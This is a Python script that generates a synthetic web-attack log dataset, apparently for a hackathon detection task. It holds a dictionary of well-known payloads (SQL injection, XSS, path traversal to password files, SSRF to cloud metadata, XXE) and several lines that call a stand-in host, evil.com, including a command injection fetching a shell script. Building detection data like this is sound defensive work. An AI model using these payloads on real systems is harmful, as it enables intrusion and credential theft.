import csv, json, random, datetime

# ---------------------------------------------------------------------------------
# Attack Types + Payloads (All required by SIH problem statement)
# ---------------------------------------------------------------------------------
attack_types_payloads = {
    "SQL_INJECTION": [
        "' OR 1=1 --",
        "1 UNION SELECT username, password FROM users --",
        "'; DROP TABLE students; --",
        "admin' OR '1'='1",
        "1 AND (SELECT sleep(5))"
    ],

    "XSS": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert('XSS')>",
        "<svg/onload=confirm(1)>",
        "<body onload=alert('xss')>",
        "<iframe src=javascript:alert(1)>"
    ],

    "DIRECTORY_TRAVERSAL": [
        "../../etc/passwd",
        "../../../boot.ini",
        "../../../../windows/system32/config",
        "../" * 10 + "etc/shadow"
    ],

    "COMMAND_INJECTION": [
        ";ls",
        "&& whoami",
        "| cat /etc/passwd",
        "`id`",
        "&& curl http://evil.com/shell.sh"
    ],

    "SSRF": [
        "http://169.254.169.254/latest/meta-data",
        "http://127.0.0.1:8080/admin",
        "http://localhost:22",
        "file:///etc/shadow",
        "gopher://localhost:11211"
    ],

    "LFI_RFI": [
        "php://filter/convert.base64-encode/resource=index.php",
        "../../../../var/log/auth.log",
        "http://evil.com/shell.php",
        "file:///etc/passwd"
    ],

    "CREDENTIAL_STUFFING": [
        "user=admin&pass=admin",
        "user=root&pass=123456",
        "user=test&pass=password",
        "user=guest&pass=guest",
        "user=admin&pass=Admin@123"
    ],

    "PARAMETER_POLLUTION": [
        "id=1&id=2",
        "role=admin&role=user",
        "page=home&page=dashboard",
    ],

    # ⭐ NEW: XXE INJECTION
    "XXE_INJECTION": [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        "<!DOCTYPE foo [<!ENTITY x SYSTEM 'file:///etc/hosts'>]><foo>&x;</foo>",
        "<!DOCTYPE bar [<!ENTITY attack SYSTEM 'http://evil.com/xxe'>]><bar>&attack;</bar>"
    ],

    "WEB_SHELL_UPLOAD": [
        "upload.php?file=shell.php",
        "cmd.jsp",
        "backdoor.asp",
        "evil.php?cmd=id",
        "upload?f=reverse_shell.php"
    ],

    "TYPOSQUATTING": [
        "goggle.com",
        "faceb00k.com",
        "paypai.com",
        "amaz0n-login.com",
        "gooogle.org"
    ],
}

# ---------------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------------
def random_ip():
    return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"

def generate_url(attack_type, payload):
    base = "http://victim.com"
    if attack_type == "CREDENTIAL_STUFFING":
        return f"{base}/login?{payload}"
    if attack_type == "TYPOSQUATTING":
        return f"http://{payload}"
    return f"{base}/attack?input={payload}"

# ---------------------------------------------------------------------------------
# Generate Dataset
# ---------------------------------------------------------------------------------
rows = []
id_counter = 1

for attack_type, payloads in attack_types_payloads.items():
    count = random.randint(60, 150)  # number of samples per attack
    for _ in range(count):
        payload = random.choice(payloads)
        rows.append({
            "id": id_counter,
            "timestamp": str(datetime.datetime.now() - datetime.timedelta(minutes=random.randint(0, 80000))),
            "src_ip": random_ip(),
            "dst_ip": "192.168.1.20",
            "method": random.choice(["GET", "POST"]),
            "url": generate_url(attack_type, payload),
            "attack_type": attack_type,
            "payload": payload,
            "is_successful": random.choice([True, False]),
            "user_agent": random.choice(["Mozilla/5.0", "curl/8.0", "SQLmap/1.5", "XSStrike"]),
            "notes": ""
        })
        id_counter += 1

# ---------------------------------------------------------------------------------
# Save CSV
# ---------------------------------------------------------------------------------
with open("attacks_full_dataset.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=rows[0].keys())
    writer.writeheader()
    writer.writerows(rows)

# ---------------------------------------------------------------------------------
# Save JSON
# ---------------------------------------------------------------------------------
with open("attacks_full_dataset.json", "w", encoding="utf-8") as f:
    json.dump(rows, f, indent=4)

print("✓ Dataset generated: attacks_full_dataset.csv & attacks_full_dataset.json")
